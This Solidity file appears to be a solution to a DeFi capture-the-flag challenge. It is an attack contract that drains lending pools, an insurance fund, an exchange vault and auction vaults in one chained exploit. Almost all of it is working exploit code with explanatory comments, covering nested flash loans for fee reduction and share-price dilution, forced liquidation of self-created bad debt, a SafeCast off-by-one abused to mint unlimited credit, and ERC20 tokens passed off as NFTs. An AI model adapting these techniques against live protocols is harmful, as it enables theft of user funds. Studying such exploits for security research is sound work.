// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

import "./interfaces/IAuctionManager.sol";
import "./interfaces/IAuctionToken.sol";
import "./interfaces/IAuctionVault.sol";
import "./interfaces/ICommunityInsurance.sol";
import "./Community Insurance/CommunityInsurance.sol";
import "./interfaces/IExchange.sol";
import "./interfaces/IExchangeVault.sol";
import "./interfaces/IFlashLoaner.sol";
import "./interfaces/IIdleMarket.sol";
import "./interfaces/IInvestmentVault.sol";
import "./interfaces/IInvestmentVaultFactory.sol";
import "./interfaces/ILendingFactory.sol";
import "./interfaces/ILendingManager.sol";
import "./interfaces/ILendingPool.sol";
import "./interfaces/ILottery.sol";
import "./interfaces/ILotteryCommon.sol";
import "./interfaces/ILotteryExtension.sol";
import "./interfaces/ILotteryStorage.sol";
import "./interfaces/IPool.sol";
import "./interfaces/IPriceOracle.sol";
import "./interfaces/IRewardDistributor.sol";
import "./interfaces/IStrategy.sol";
import "./interfaces/IWeth.sol";

contract AttackContract {
    IERC20 public constant usdc = IERC20(0xBf1C7F6f838DeF75F1c47e9b6D3885937F899B7C);
    IERC20 public constant nisc = IERC20(0x20e4c056400C6c5292aBe187F832E63B257e6f23);
    IWeth public constant weth = IWeth(0x13d78a4653e4E18886FBE116FbB9065f1B55Cd1d);
    ILottery public constant lottery = ILottery(0x6D03B9e06ED6B7bCF5bf1CF59E63B6eCA45c103d);
    ILotteryExtension public constant lotteryExtension = ILotteryExtension(0x6D03B9e06ED6B7bCF5bf1CF59E63B6eCA45c103d);
    IAuctionVault public constant auctionVault = IAuctionVault(0x9f4a3Ba629EF680c211871c712053A65aEe463B0);
    IAuctionManager public constant auctionManager = IAuctionManager(0x228F0e62b49d2b395Ee004E3ff06841B21AA0B54);
    IStrategy public constant lendingPoolStrategy = IStrategy(0xC5cBC10e8C7424e38D45341bD31342838334dA55);
    IExchangeVault public constant exchangeVault = IExchangeVault(0x776B51e76150de6D50B06fD0Bd045de0a13D68C7);
    // Product pools: [0] = USDC/WETH pool, [1] = USDC/NISC pool
    IPool[] public productPools = [IPool(0x536BF770397157efF236647d7299696B90Bc95f1), IPool(0x6cAC85Dc0D547225351097Fb9eEb33D65978bb73)];
    IPriceOracle public constant priceOracle = IPriceOracle(0x9231ffAC09999D682dD2d837a5ac9458045Ba1b8);
    ILendingFactory public constant lendingFactory = ILendingFactory(0xdC5b6f8971AD22dC9d68ed7fB18fE2DB4eC66791);
    // Lending managers: [0] = Lending Trio 1 manager, [1] = Lending Trio 2 manager
    ILendingManager[] public lendingManagers = [ILendingManager(0x66bf9ECb0B63dC4815Ab1D2844bE0E06aB506D4f), ILendingManager(0x5FdA5021562A2Bdfa68688d1DFAEEb2203d8d045)];
    ILendingPool[] public lendingPoolsA = [ILendingPool(0xfAC23E673e77f76c8B90c018c33e061aE8F8CBD9), ILendingPool(0xFa6c040D3e2D5fEB86Eda9e22736BbC6eA81a16b)];
    ILendingPool[] public lendingPoolsB = [ILendingPool(0xb022AE7701DF829F2FF14B51a6DFC8c9A95c6C61), ILendingPool(0x537B309Fec55AD15Ef2dFae1f6eF3AEBD80d0d9c)];
    IFlashLoaner public constant flashLoaner = IFlashLoaner(0x5861a917A5f78857868D88Bd93A18A3Df8E9baC7);
    IInvestmentVaultFactory public constant investmentFactory = IInvestmentVaultFactory(0xd526270308228fDc16079Bd28eB1aBcaDd278fbD);
    IIdleMarket public constant usdcIdleMarket = IIdleMarket(0xB926534D703B249B586A818B23710938D40a1746);
    // Investment vaults: [0] = USDC Strategy 1 vault, [1] = USDC Strategy 2 vault
    IInvestmentVault[] public investmentVaults = [IInvestmentVault(0x99828D8000e5D8186624263f1b4267aFD4E27669), IInvestmentVault(0xe7A23A3Bf899f67e0B40809C8f449A7882f1a26E)];
    ICommunityInsurance public constant communityInsurance = ICommunityInsurance(0x83f3997529982fB89C4c983D82d8d0eEAb2Bb034);
    IRewardDistributor public constant rewardDistributor = IRewardDistributor(0x73a8004bCD026481e27b5B7D0d48edE428891995);
    constructor() payable {}
    
    // Attack mode: 1=liquidate, 2=drain
    uint8 public attackMode;
     // Phases: 1=outer, 2=inner1, 3=inner2(main), 4=tiny(unlock)
    uint8 public phase;
    uint256 public outerFL;
    uint256 public innerFL;
    uint256 public innerFL2;
    uint256 public cachedAmount;
    address public targetDebtor = 0xfa614DEB6D1b897099C15B512c5A62C6a6611bdC;
    address public targetDebtor2 = 0x11c8738979A536F9F9AEE32d1724D62ac1adb7De;
    address public targetDebtor3 = 0xd906fa937Caa022Fa08B58316c59A5262c048d2C;
    ILendingPool public targetPool;
    IERC20 public targetToken;

/*
    Attack overview:
    [Lending Pool - fully drained]
    - Liquidate first position with flash loan
    - Drain all pools with flash loans and price manipulation, succeeded to reduce the flash loan fee from 10% to 0,075% (4 nested flash loans: 1 for unlocking the flag and 3 for fee reduction)
    - After pools draining, it appeared 3 more bad debts but not profitable for direct liquidation
    - Liquidate these 3 bad debts from Community Insurance, it paid the debt with its own capital and take the collateral
    - Drain all pulls again - the new fresh capital which came from Community Insurance to the lending protocol from the liquidations
    [Idle Market]
    - Deposits go forward (LP A → LP B → IdleMarket), but withdrawals go reverse (IdleMarket → LP B → LP A)
    [Community Insurance - fully drained]
    - Creating self bad debt positions in lending protocol and make Community Insurance to liquidate them, repeat until fully drained
    [Exchange]
    - Drain USDC/NISC pool: Exploiting SafeCast off-by-one bug to create infinite credit in Exchange Vault
    [Auction]
    - Drain Auction Vault by creating fake NFT auctions by depositing ERC20 tokens as fake NFTs which inflate the share price
    - Buy ticket 0 for free: deposited tokens for the ticket purchase are drained back from the USDC vault 
    - Drain NISC vault with the same technique
    - Buy tickets 1 and 2 at discount price by creating more fake auctions
    [Lottary]
    - Solving math puzzles for all tickets taken from the auctions
*/

    function Attack() public {
        console.log('Attack contract deployed at:', address(this));

        // Add your exploit or test logic here.

		attackMode = 1;
        liquidate();
        
        attackMode = 2;
        // Drain Pool A (USDC) Lending Trio 1
        drainPool(msg.sender, lendingPoolsA[0], usdc); // execute x2
        // Drain Pool A (USDC) Lending Trio 2
        drainPool(msg.sender, lendingPoolsA[1], usdc); // execute x3
        swapUsdcToWeth(105000e6, msg.sender);
        // Drain Pool B (WETH) Lending Trio 1
        drainPool(msg.sender, lendingPoolsB[0], weth); // execute x2
        swapUsdcToNisc(1000e6, msg.sender);
        // Pool B (NISC) Lending Trio 2
        drainPool(msg.sender, lendingPoolsB[1], nisc); // execute x9
        
        drainIdleMarket(msg.sender);
        
        liquidateWithCI(msg.sender, lendingManagers[0], targetDebtor2, ILendingManager.AssetType.B);
        liquidateWithCI(msg.sender, lendingManagers[1], targetDebtor2, ILendingManager.AssetType.B);
        liquidateWithCI(msg.sender, lendingManagers[1], targetDebtor3, ILendingManager.AssetType.A);
        
        // Drain more WETH from liquidation: Pool B (WETH) Lending Trio 1
        drainPool(msg.sender, lendingPoolsB[0], weth);
        // Drain more USDC from liquidation: Pool A (USDC) Lending Trio 2
        drainPool(msg.sender, lendingPoolsA[1], usdc);
        // Drain more NISC from liquidation: Pool B (NISC) Lending Trio 2
        drainPool(msg.sender, lendingPoolsB[1], nisc); 
        
        selfLiquidateWithCI(msg.sender, lendingManagers[0], ILendingManager.AssetType.B); 
        selfLiquidateWithCI(msg.sender, lendingManagers[1], ILendingManager.AssetType.B);
        selfLiquidateWithCI(msg.sender, lendingManagers[0], ILendingManager.AssetType.A);
        drainPool(msg.sender, lendingPoolsB[0], weth);
        drainPool(msg.sender, lendingPoolsB[1], nisc); 
        drainPool(msg.sender, lendingPoolsA[0], usdc);
        
        drainExchange(msg.sender);
        
        drainAuctionAndGetTickets(msg.sender);

        attackMode = 0;

        // Transfer all assets to the attacker
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
        nisc.transfer(msg.sender, nisc.balanceOf(address(this)));
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function onCallback(bytes calldata data) external {
        if (attackMode == 1) {
            liquidateCallback();
        } else if (attackMode == 2) {
            drainPoolCallback();
        } 
    }

    receive() external payable {}

    function liquidate() public {
        // Exploit lendgin protocol part 1: liquidate poistion
        IERC20(usdc).approve(address(lendingManagers[0]), type(uint256).max);
        ILendingPool poolA = lendingPoolsA[0];
        uint256 poolCash = poolA.getCash();
        outerFL = poolCash / 133;
        innerFL = outerFL * 11;
        innerFL2 = outerFL * 121;  // or innerFL * 11
        phase = 1;
        flashLoaner.flashloan(usdc, outerFL, address(this), "");
        phase = 0;
    }

    function liquidateCallback() internal {
        if (phase == 1) {
            // outerFL callback
            // Start inner FL (11x for fee reduction)
            phase = 2;
            flashLoaner.flashloan(usdc, innerFL, address(this), "");

        } else if (phase == 2) {
        	// start inner2 FL
        	phase = 3;
            flashLoaner.flashloan(usdc, innerFL2, address(this), "");

        } else if (phase == 3) {
            // inner2 FL - Main attack happens here

            // TINY FL to clear the flag
            phase = 4;
            flashLoaner.flashloan(usdc, 1, address(this), "");

            // Flag is now cleared! Do the liquidation
            ILendingPool poolB = lendingPoolsB[0];
            uint256 sharesBefore = poolB.balanceOf(address(this));
            ILendingManager manager = lendingManagers[0];
            manager.liquidate(ILendingManager.AssetType.A, targetDebtor);
            uint256 shares = poolB.balanceOf(address(this)) - sharesBefore;

            // Redeem for WETH
            uint256 wethAmt = poolB.redeem(shares, address(this), address(this));

            // Swap WETH → USDC
            uint256 fee = exchangeVault.fee();
            uint256 netSwap = wethAmt * 10000 / (10000 + fee);
            exchangeVault.unlock(abi.encodeWithSelector(this.doSwapWethToUsdc.selector, netSwap));

            // Repay inner FL
            uint256 flFee = flashLoaner.flashloanFee();
            uint256 innerRepay = innerFL2 + (innerFL2 * flFee / 10000) + 1;
            usdc.transfer(address(flashLoaner), innerRepay);

        } else if (phase == 4) {
            // TINY FL - Just clears the flag
            usdc.transfer(address(flashLoaner), 2); // 1 + fee
        }
    }
    
    //     The pattern for deeper nesting:

    //   | Levels | Divisor        | Formula                    |
    //   |--------|----------------|----------------------------|
    //   | 2      | 12             | 1 + 11 = 12                |
    //   | 3      | 133            | 1 + 11 + 121 = 133         |
    //   | 4      | 1464           | 1 + 11 + 121 + 1331 = 1464 |
    //   | n      | (11ⁿ - 1) / 10 | Geometric series sum       |

    //   The 11 comes from the 10% flash loan fee: to cover the fee of the inner loan, the outer loan needs to be
    //   inner / 11 (since inner × 1.1 = inner + inner/10, you need inner/11 extra to cover the fee).
    
    function drainPool(address attacker, ILendingPool _targetPool, IERC20 _targetToken) public {
        uint256 amount = _targetToken.balanceOf(attacker);
        _targetToken.transferFrom(attacker, address(this), amount);

        
        _targetToken.approve(address(_targetPool), type(uint256).max);
        uint256 poolCash = _targetPool.getCash();
        outerFL = poolCash / 133;
        innerFL = outerFL * 11;
        innerFL2 = outerFL * 121;  // or innerFL * 11
        cachedAmount = amount;
        phase = 1;
        targetPool = _targetPool;
        targetToken = _targetToken;

        // Share price dilution
        flashLoaner.flashloan(_targetToken, outerFL, address(this), "");
        // share price is restored we can redeem
        uint256 shares = _targetPool.balanceOf(address(this));
        if (shares > 0) {
            _targetPool.redeem(shares, address(this), address(this));
        }

        phase = 0;
        cachedAmount = 0;
    }
    
    function drainPoolCallback() internal {
    	if (phase == 1) {
            // outer FL - smallest, we pay fee on this

            // start inner FL
            phase = 2;
            flashLoaner.flashloan(targetToken, innerFL, address(this), "");
        } else if (phase == 2) {
        
        	// start inner2 FL
        	phase = 3;
            flashLoaner.flashloan(targetToken, innerFL2, address(this), "");

        } else if (phase == 3) {
            // inner2 FL - Price is now crashed!

            // tiny FL to clear the flag
            phase = 4;
            flashLoaner.flashloan(targetToken, 1, address(this), "");

            // Flag cleared! Deposit at crashed price!

            // Calculate repay amount for inner FL
            uint256 flFee = flashLoaner.flashloanFee();
            uint256 innerRepay = innerFL2 + (innerFL2 * flFee / 10000) + 1;
            // After deposit there should be enough amout to repay
            uint256 depositAmount = cachedAmount + innerFL2 + innerFL + outerFL - innerRepay - 1;
            targetPool.deposit(depositAmount, address(this));

            // Repay inner FL
            targetToken.transfer(address(flashLoaner), innerRepay);

        } else if (phase == 4) {
            // TINY FL - Just clears the flag
            targetToken.transfer(address(flashLoaner), 2); // 1 + fee
        }
    }

    function doSwapWethToUsdc(uint256 wethAmount) external {
        uint256 fee = exchangeVault.fee();
        uint256 feeAmt = wethAmount * fee / 10000;
        IERC20(weth).approve(address(exchangeVault), type(uint256).max);
        exchangeVault.settle(weth, wethAmount + feeAmt);
        IPool exchangePool = productPools[0];
        uint256 out = exchangeVault.swapInPool(exchangePool, weth, usdc, wethAmount, 0);
        exchangeVault.sendTo(usdc, address(this), out);
    }
    
    function swapUsdcToWeth(uint256 usdcAmount, address attacker) public {
        usdc.transferFrom(attacker, address(this), usdcAmount);
        uint256 fee = exchangeVault.fee();
        uint256 netSwap = usdcAmount * 10000 / (10000 + fee);
        exchangeVault.unlock(abi.encodeWithSelector(this.doSwapUsdcToWeth.selector, netSwap));
    }

    function doSwapUsdcToWeth(uint256 usdcAmount) external {
        uint256 fee = exchangeVault.fee();
        uint256 feeAmt = usdcAmount * fee / 10000;
        IERC20(usdc).approve(address(exchangeVault), type(uint256).max);
        exchangeVault.settle(usdc, usdcAmount + feeAmt);
        IPool exchangePool = productPools[0];
        uint256 wethOut = exchangeVault.swapInPool(exchangePool, usdc, weth, usdcAmount, 0);
        exchangeVault.sendTo(weth, address(this), wethOut);
    }
    
    function swapUsdcToNisc(uint256 usdcAmount, address attacker) public {
        usdc.transferFrom(attacker, address(this), usdcAmount);
        uint256 fee = exchangeVault.fee();
        uint256 netUsdcAmount = usdcAmount * 10000 / (10000 + fee);
        exchangeVault.unlock(abi.encodeWithSelector(this.doSwapUsdcToNisc.selector, netUsdcAmount));
    }

    function doSwapUsdcToNisc(uint256 usdcAmount) external {
        uint256 fee = exchangeVault.fee();
        uint256 feeAmt = usdcAmount * fee / 10000;
        IERC20(usdc).approve(address(exchangeVault), type(uint256).max);
        exchangeVault.settle(usdc, usdcAmount + feeAmt);
        IPool exchangePool = productPools[1];
        uint256 niscOut = exchangeVault.swapInPool(exchangePool, usdc, nisc, usdcAmount, 0);
        exchangeVault.sendTo(nisc, address(this), niscOut);
    }
    
    function liquidateWithCI(address attacker, ILendingManager manager, address debtor, ILendingManager.AssetType assetType) public {
    	(uint256 depositNeeded, ILendingPool collateralPool, IERC20 collateralToken) =
        getCILiquidationInfo(manager, debtor, assetType);
        
        collateralToken.transferFrom(attacker, address(this), depositNeeded);
        collateralToken.approve(address(collateralPool), depositNeeded);
        collateralPool.deposit(depositNeeded, address(this));
        
        CommunityInsurance(address(communityInsurance)).liquidateBadDebt(manager, debtor, assetType);
    }
    
    function getCILiquidationInfo(ILendingManager manager, address user, ILendingManager.AssetType assetType) internal view 
    returns (uint256 depositNeeded, ILendingPool collateralPool, IERC20 collateralToken) {
        // Get position
        (uint256 collateralAShares,,uint256 collateralBShares,) = manager.positions(user);
        uint256 collateralShares;

        // Determine pools and collateral based on debt type
        if (assetType == ILendingManager.AssetType.A) {
            collateralPool = manager.poolB();
			collateralToken = manager.assetB();
            collateralShares = collateralBShares;
        } else {
            collateralPool = manager.poolA();
            collateralToken = manager.assetA();
            collateralShares = collateralAShares;
        }

        // Calculate deposit needed (assuming pool is fully drained)
        uint256 totalAssets = collateralPool.totalAssets();
        uint256 totalSupply = collateralPool.totalSupply();
        uint256 cash = collateralPool.getCash();
        uint256 outstandingDebt = totalAssets - cash;

        if (totalSupply > 0) {
            depositNeeded = (collateralShares * outstandingDebt) / totalSupply + 1;
        }
    }
    
    function selfLiquidateWithCI(address attacker, ILendingManager manager, ILendingManager.AssetType assetType) public {
    	ILendingPool collateralPool;
        ILendingPool debtPool;
        IERC20 collateralToken;
        IERC20 debtToken;
        ILendingManager.AssetType collateralType;
        
        if (assetType == ILendingManager.AssetType.A) {
            collateralPool = manager.poolB();
            debtPool = manager.poolA();
            collateralToken = manager.assetB();
            debtToken = manager.assetA();
            collateralType = ILendingManager.AssetType.B; 
        } else {
            collateralPool = manager.poolA();
            debtPool = manager.poolB();
            collateralToken = manager.assetA();
            debtToken = manager.assetB();
            collateralType = ILendingManager.AssetType.A; 
        }
        
        (uint256 borrowAmount, uint256 collateralAmount, uint256 debtPoolFundAmount) = getPositionAmounts(collateralToken, debtToken);
        
        // STEP 1: Fund debt pool
        debtToken.transferFrom(attacker, address(this), debtPoolFundAmount);
        debtToken.approve(address(debtPool), debtPoolFundAmount);
        debtPool.deposit(debtPoolFundAmount, msg.sender);
        
        // STEP 2: Create position
        collateralToken.transferFrom(attacker, address(this), collateralAmount);
        collateralToken.approve(address(collateralPool), collateralAmount);
        uint256 shares = collateralPool.deposit(collateralAmount, address(this));
        
        IERC20(address(collateralPool)).approve(address(manager), shares);
        manager.lockCollateral(collateralType, shares);
        manager.borrow(assetType, borrowAmount);
        debtToken.transfer(attacker, borrowAmount);
        
        // DRAIN POOL 
        drainPool(attacker, collateralPool, collateralToken);
        
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
        nisc.transfer(attacker, nisc.balanceOf(address(this)));
        weth.transfer(attacker, weth.balanceOf(address(this)));
        
        // self liquidate
        liquidateWithCI(attacker, manager, address(this), assetType);
    }
    
    function getPositionAmounts(IERC20 collateralToken, IERC20 debtToken) internal view returns (uint256 borrowAmount, uint256 collateralAmount, uint256 debtPoolFundAmount) {
    	if (collateralToken == usdc && debtToken == weth) {
         	(borrowAmount, collateralAmount, debtPoolFundAmount) = getWethUsdcPositionAmounts();
        } else if (collateralToken == usdc && debtToken == nisc) {
         	(borrowAmount, collateralAmount, debtPoolFundAmount) = getNiscUsdcPositionAmounts();
        } else if (collateralToken == weth && debtToken == usdc) {
         	(borrowAmount, collateralAmount, debtPoolFundAmount) = getUsdcWethPositionAmounts();
        }
    }
    
    function getWethUsdcPositionAmounts() internal view returns (uint256 borrowAmount, uint256 collateralAmount, uint256 debtPoolFundAmount) {
    	// Get CI's WETH balance
        uint256 ciWeth = communityInsurance.internalBalance(weth);
        borrowAmount = (ciWeth * 999) / 1000; // 99.9%

        // Convert WETH to USD value in USDC decimals (6)
        // borrowAmount (18 dec) * $2000 * 1e6 / 1e18 = USD value in 6 decimals
        uint256 borrowValueUSDC = (borrowAmount * 2000 * 1e6) / 1e18;

        // Required collateral = borrow / LTV + buffer
        // LTV = 75%, so divide by 0.75 = multiply by 100/75
        collateralAmount = (borrowValueUSDC * 100) / 75 + 2000e6;

        debtPoolFundAmount = borrowAmount + 0.1e18;
    }
    
    function getNiscUsdcPositionAmounts() internal view returns (uint256 borrowAmount, uint256 collateralAmount, uint256 debtPoolFundAmount) {
    	// Get CI's NISC balance
        uint256 ciNisc = communityInsurance.internalBalance(nisc);
        borrowAmount = (ciNisc * 999) / 1000; // 99.9%
        
        // NISC = $0.25, so borrowUSD = borrowAmount * 0.25
        uint256 borrowUSD = (borrowAmount * 25) / 100 / 1e12; // Convert to 6 decimals
        collateralAmount = (borrowUSD * 100) / 75 + 2000e6;
        
        debtPoolFundAmount = borrowAmount + 100e18;
    }
    
    function getUsdcWethPositionAmounts() internal view returns (uint256 borrowAmount, uint256 collateralAmount, uint256 debtPoolFundAmount) {
    	// Get CI's USDC balance
        uint256 ciUsdc = communityInsurance.internalBalance(usdc);
        borrowAmount = (ciUsdc * 999) / 1000; // 99.9%
        
        // WETH = $2000, so collateralWETH = borrowUSD / 2000 / 0.75
        collateralAmount = (borrowAmount * 1e12 * 100) / (2000 * 75) + 1e18;

        debtPoolFundAmount = borrowAmount + 100e6;
    }
 
    //   Drains both USDC and NISC from Exchange Vault using two combined bugs:

    //   BUG 1: SafeCast off-by-one (ExchangeVault.sol)
    //     - toInt256(2^255) returns -2^255 instead of reverting
    //     - _takeDebt(2^255) creates CREDIT instead of debt!

    //   BUG 2: NISC self-transfer optimization (NISC.sol)
    //     - if (from == to) { return; } makes self-transfers NO-OP
    //     - sendTo(NISC, vault, X) records delta but doesn't move tokens

    //   EXPLOIT:
    //     1. Create infinite NISC credit: sendTo(NISC, vault, 2^255)
    //     2. Drain USDC via swap or drain NISC directly
    //     3. Balance delta with complementary sendTo
    //     4. All NISC transfers are NO-OPs, we only pay gas!
    
    function drainExchange(address attacker) public {
    	exchangeVault.unlock(abi.encodeWithSelector(this.drainExchangeCallback.selector));
    }
    
    function drainExchangeCallback() external {
    	// 2^255 triggers the SafeCast bug
    	uint256 MAGIC = 1 << 255;
    	uint256 poolNisc = exchangeVault.poolBalances(productPools[1], nisc);
        uint256 poolUsdc = exchangeVault.poolBalances(productPools[1], usdc);
        
        // Phase 1: Drain USDC via swap
        if (poolUsdc > 1 && poolNisc > 0) {
            // Calculate swap input to drain all USDC
            uint256 swapInput = (poolNisc * (poolUsdc - 1)) * 105 / 100; // 5% buffer

            // Create infinite NISC credit (self-transfer = NO-OP)
            exchangeVault.sendTo(nisc, address(exchangeVault), MAGIC);

            // Swap NISC -> USDC using infinite credit
            uint256 usdcOut = exchangeVault.swapInPool(productPools[1], nisc, usdc, swapInput, 0);

            // Withdraw USDC to owner
            if (usdcOut > 0) {
                exchangeVault.sendTo(usdc, address(this), usdcOut);
            }

            // Balance NISC delta (self-transfer = NO-OP)
            uint256 fee = (swapInput * exchangeVault.fee()) / exchangeVault.PERCENT_DIVISOR();
            exchangeVault.sendTo(nisc, address(exchangeVault), MAGIC - swapInput - fee);
        }
        
        // Phase 2: Drain NISC directly
        uint256 vaultNisc = nisc.balanceOf(address(exchangeVault));

        if (vaultNisc > 0) {
            // Create infinite NISC credit (self-transfer = NO-OP)
            exchangeVault.sendTo(nisc, address(exchangeVault), MAGIC);

            // Withdraw NISC to owner (REAL transfer!)
            exchangeVault.sendTo(nisc, address(this), vaultNisc);

            // Balance NISC delta (self-transfer = NO-OP)
            exchangeVault.sendTo(nisc, address(exchangeVault), MAGIC - vaultNisc);
        }
    }
    
    // Drain IdleMarket by deposit-redeem attack
    // Redeem pulls from IdleMarket FIRST (reverse iteration order)
    // Deposits go forward (LP A → LP B → IdleMarket), but withdrawals go reverse (IdleMarket → LP B → LP A).
    function drainIdleMarket(address attacker) public {
    	uint depositAmount = usdc.balanceOf(address(usdcIdleMarket));
    	usdc.transferFrom(attacker, address(this), depositAmount);
        uint256 half = depositAmount / 2;
        
        // Vault 0
        usdc.approve(address(investmentVaults[0]), half);
      	investmentVaults[0].deposit(half, address(this));
      	investmentVaults[0].redeem(investmentVaults[0].balanceOf(address(this)), address(this), address(this));

        // Vault 1
        usdc.approve(address(investmentVaults[1]), depositAmount - half);
        investmentVaults[1].deposit(depositAmount - half, address(this));
        investmentVaults[1].redeem(investmentVaults[1].balanceOf(address(this)), address(this), address(this));
    }
    
    //  VULNERABILITY:
    //  createAuction accepts IERC721 nftContract but doesn't validate it's actually an ERC721.
    //  Both ERC20 and ERC721 have transferFrom(address, address, uint256) with the same signature.
    //  This allows inflating vault balance by "depositing" ERC20 as fake NFT, then withdrawing
    //  at inflated share price.
    function drainAuctionAndGetTickets(address attacker) public {
    	nisc.transferFrom(attacker, address(this), nisc.balanceOf(attacker));
        usdc.transferFrom(attacker, address(this), usdc.balanceOf(attacker));
        weth.transferFrom(attacker, address(this), 100); // Only need 100 wei for settlements
        
    	nisc.approve(address(auctionManager), type(uint256).max);
        usdc.approve(address(auctionManager), type(uint256).max);
        weth.approve(address(auctionManager), type(uint256).max);

        IERC20 aNisc = auctionManager.auctionTokens(nisc);
        IERC20 aUsdc = auctionManager.auctionTokens(usdc);
        IERC20 aWeth = auctionManager.auctionTokens(weth);

        aNisc.approve(address(auctionManager), type(uint256).max);
        aUsdc.approve(address(auctionManager), type(uint256).max);
        aWeth.approve(address(auctionManager), type(uint256).max);
        
        auctionManager.depositERC20(weth, 100); // 100 wei is more than enough for all bids
        
        // Win auction 0
        auctionManager.depositERC20(usdc, 201000e6);
        auctionManager.bid(0, 200000e6);
        
        // Drain USDC auction vault -> the same USDC that we deposited to win the auction 0
        // Geometric sequence: start=230k, ratio=0.8 (4/5), iterations=13
        uint256 usdcStartId = auctionManager.auctionCount();
        uint256 usdcDeposit = 230000e6;
        for (uint256 i = 0; i < 13; i++) {
            createFakeAuction(usdc, usdcDeposit);
            usdcDeposit = usdcDeposit * 4 / 5; // × 0.8
        }

        // Batch settle all USDC auctions
        settleAuctionRange(usdcStartId, auctionManager.auctionCount());
        
        // Drain NISC auction vault
        // Geometric sequence: start=175k, ratio=0.36 (9/25), iterations=3
        uint256 niscStartId = auctionManager.auctionCount();
        uint256 niscDeposit = 175000e18;
        for (uint256 i = 0; i < 3; i++) {
            createFakeAuction(nisc, niscDeposit);
            niscDeposit = niscDeposit * 9 / 25; // × 0.36
        }
        // Batch settle all NISC auctions
        settleAuctionRange(niscStartId, auctionManager.auctionCount());
        
        // Buy Dutch auctions
        buyDutchAuction(2, 63000e18);
        buyDutchAuction(1, 58000e18);
        
        // Solve puzzles for 3 tickets taken from the auction
        solveLottary();
    }
    
    // deposit → create fake auction → withdraw
    function createFakeAuction(IERC20 token, uint256 depositAmount) internal {
        IERC20 aToken = auctionManager.auctionTokens(token);

        // Deposit
        auctionManager.depositERC20(token, depositAmount);

        // Create fake auction with ALL remaining tokens as "NFT"
        uint256 inflateAmount = token.balanceOf(address(this));
        auctionManager.createAuction(
            IERC721(address(token)), // wrap ERC20 token as NFT
            inflateAmount,
            0, 0,  // startTime, duration
            weth,
            1      // minBid
        );

        // Withdraw ALL shares at inflated price
        uint256 shares = aToken.balanceOf(address(this));
        auctionManager.withdrawERC20(token, shares);
    }
    
    function settleAuctionRange(uint256 startId, uint256 endId) internal {
        for (uint256 id = startId; id < endId; id++) {
            auctionManager.bid(id, 1);
        }
    }
    
    function buyDutchAuction(uint256 auctionId, uint256 depositAmount) internal {
    	auctionManager.depositERC20(nisc, depositAmount);
        // Create fake auction before BUY → Inflates value of those shares, so we can buy cheaper
        uint256 auctionIdFake = auctionManager.createAuction(
            IERC721(address(nisc)), nisc.balanceOf(address(this)), 0, 0, weth, 1
        );
        auctionManager.buy(auctionId);
        auctionManager.bid(auctionIdFake, 1);
    }
    
    function solveLottary() internal {
    	// 93740: x^2 mod N = 93740
      	uint256 X_93740 = 22944716803525420696533866530183787158952213232330281032959477737241389970872;
        ILotteryExtension(address(lottery)).solveMulmod93740(0, X_93740);
        
        // 90174: x^2 mod N = 90174
      	uint256 X_90174 = 40289530849315046632803046237695507888814621779004955301521665942329666711931;
        ILotteryExtension(address(lottery)).solveMulmod90174(1, X_90174);
        
        // 89443: x^2 mod N = 89443
      	uint256 X_89443 = 25763313276182728748094861671409962815748632632615992537054984139247576418966;
        ILotteryExtension(address(lottery)).solveMulmod89443(2, X_89443);
    }
 }